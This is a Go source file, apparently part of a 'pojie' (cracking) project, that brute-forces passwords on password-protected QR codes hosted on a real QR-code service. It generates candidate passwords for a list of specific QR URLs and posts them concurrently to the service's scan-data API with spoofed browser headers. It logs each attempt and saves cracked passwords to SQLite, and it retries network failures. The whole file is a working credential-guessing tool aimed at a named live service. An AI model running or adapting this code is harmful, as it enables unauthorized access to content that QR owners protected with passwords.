package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"qz-go/pojie/common"
	"qz-go/pojie/db"
	v2 "qz-go/pojie/v2"
	"strings"
	"sync"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

// 二维码地址列表
var qrCodes = []string{
	//"https://qr71.cn/orHY8H/qLhqfi1",
	//"https://qr71.cn/orHY8H/qwGKfdp",
	//"https://qr71.cn/orHY8H/q0wPTPN",
	//"https://qr71.cn/orHY8H/qdL7RDG",
	//"https://qr71.cn/orHY8H/qAWBzGV",
	//"https://qr71.cn/orHY8H/qo5MqFe",
	//"https://qr71.cn/orHY8H/q1UWFR4",
	"https://qr71.cn/orHY8H/qXpnpad",
}

// HTTP 客户端（超时控制）
var httpClient = &http.Client{Timeout: 10 * time.Second}

func main() {
	db.InitDB()
	defer db.DB.Close()

	var wg sync.WaitGroup
	jobs := make(chan string, 100)

	// 启动 5 个 Goroutine 进行破解
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go worker(jobs, &wg)
	}

	// 生成 00000 - 99999 的密码
	for _, qrcode := range qrCodes {
		crackedCh := make(chan bool)
		go func(qr string) {
			crackedCh <- db.IsCracked(qr)
		}(qrcode)

		if <-crackedCh { // **并行检查是否已破解**
			fmt.Printf("✅ 已破解，跳过二维码: %s\n", qrcode)
			continue
		}

		for i := 0; i < 1000; i++ {
			password := fmt.Sprintf("afd%03d", i)
			//password := fmt.Sprintf("%05d", i)
			attemptedCh := make(chan bool)
			go func(qr, pwd string) {
				attemptedCh <- db.IsAttempted(qr, pwd)
			}(qrcode, password)

			if <-attemptedCh { // **并行检查是否已尝试**
				continue
			}

			jobs <- fmt.Sprintf("%s,%s", qrcode, password)
		}
	}

	close(jobs)
	wg.Wait()
}

// 处理密码尝试
func worker(jobs chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		data := strings.Split(job, ",")
		qrcode, password := data[0], data[1]

		crackedCh := make(chan bool)
		go func(qr string) {
			crackedCh <- db.IsCracked(qr)
		}(qrcode)

		if <-crackedCh { // **并行检查是否已破解**
			continue
		}

		success, err := v2.TryPassword2(qrcode, password)
		status := common.StatusPasswordFailure
		if err != nil {
			status = common.StatusNetworkFailure
			db.LogDBError(fmt.Sprintf("❌ 网络请求失败: %s - %s - 错误: %v", qrcode, password, err))
		} else if success {
			status = common.StatusSuccess
			db.SaveCrackedQR(qrcode, password)
			fmt.Printf("✅ 破解成功: %s - %s\n", qrcode, password)
		}

		db.SaveAttempt(qrcode, password, status)
		time.Sleep(500 * time.Millisecond)
	}
}

// 发送 HTTP 请求
func tryPassword(qrcodeRoute, password string) (bool, error) {
	formData := url.Values{}
	formData.Set("qrcode_route", qrcodeRoute)
	formData.Set("password", password)

	req, err := http.NewRequest("POST", "targetURL", bytes.NewBufferString(formData.Encode()))
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := httpClient.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	return checkSuccess(body), nil
}

func tryPassword2(qrcodeRoute, password string) (bool, error) {
	url := "https://nc.caoliao.net/qrcoderoute/getQrcodeScanData"
	payload := fmt.Sprintf(`target_data_map=[{"target_type":"qrcode_data","target_params":{"qrcode_route":"%s","password":"%s","render_default_fields":"0","render_component_number":0,"render_edit_btn":"1"}}]&with_markdown=1`, qrcodeRoute, password)

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		return false, err
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Origin", "https://h5.clewm.net")
	req.Header.Set("Referer", "https://h5.clewm.net/")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Storage-Access", "active")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")
	req.Header.Set("sec-ch-ua", `"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", "macOS")
	req.Header.Set("x-rf", "feature-split-support")

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	return checkSuccess2(body), nil
}

// 解析 JSON 判断是否成功
func checkSuccess(body []byte) bool {
	var res struct {
		Msg struct {
			Code string `json:"code"`
		} `json:"msg"`
	}

	err := json.Unmarshal(body, &res)
	if err != nil {
		db.LogDBError("解析body失败")
		return false
	}

	return res.Msg.Code == "0"
}

func checkSuccess2(body []byte) bool {
	var res struct {
		Data struct {
			QrcodeData struct {
				Msg struct {
					Code string `json:"code"`
				} `json:"msg"`
			} `json:"qrcode_data"`
		} `json:"data"`
	}

	err := json.Unmarshal(body, &res)
	if err != nil {
		db.LogDBError("解析body失败")
		return false
	}

	return res.Data.QrcodeData.Msg.Code == "0"
}

func retryFailedAttempts() {
	rows, err := db.DB.Query(`
        SELECT qrcode_route, password FROM attempts WHERE status = ?`, common.StatusNetworkFailure)
	if err != nil {
		db.LogDBError(fmt.Sprintf("❌ 查询网络失败记录失败: %v", err))
		return
	}
	defer rows.Close()

	var retryList []struct {
		QRRoute  string
		Password string
	}

	// 读取所有网络失败的记录
	for rows.Next() {
		var qrRoute, password string
		if err := rows.Scan(&qrRoute, &password); err != nil {
			db.LogDBError(fmt.Sprintf("❌ 解析查询结果失败: %v", err))
			continue
		}
		retryList = append(retryList, struct {
			QRRoute  string
			Password string
		}{qrRoute, password})
	}

	// 遍历重试
	for _, attempt := range retryList {
		success, err := v2.TryPassword2(attempt.QRRoute, attempt.Password)
		if err != nil {
			// 仍然失败，更新 `updated_at` 以便下次继续重试
			_, _ = db.DB.Exec(`
                UPDATE attempts SET updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				attempt.QRRoute, attempt.Password)
			db.LogDBError(fmt.Sprintf("❌ 重新请求失败: %s - %s - 错误: %v", attempt.QRRoute, attempt.Password, err))
			continue
		}

		if success {
			// 成功破解，存入 cracked_qr 表，并更新 attempts 的状态为成功
			db.SaveCrackedQR(attempt.QRRoute, attempt.Password)
			_, _ = db.DB.Exec(`
                UPDATE attempts SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				common.StatusSuccess, attempt.QRRoute, attempt.Password)
			fmt.Printf("✅ 重新请求成功: %s - %s\n", attempt.QRRoute, attempt.Password)
		} else {
			// 仍然失败，但不是网络错误，更新 status
			_, _ = db.DB.Exec(`
                UPDATE attempts SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE qrcode_route = ? AND password = ?`,
				common.StatusPasswordFailure, attempt.QRRoute, attempt.Password)
		}
	}
}
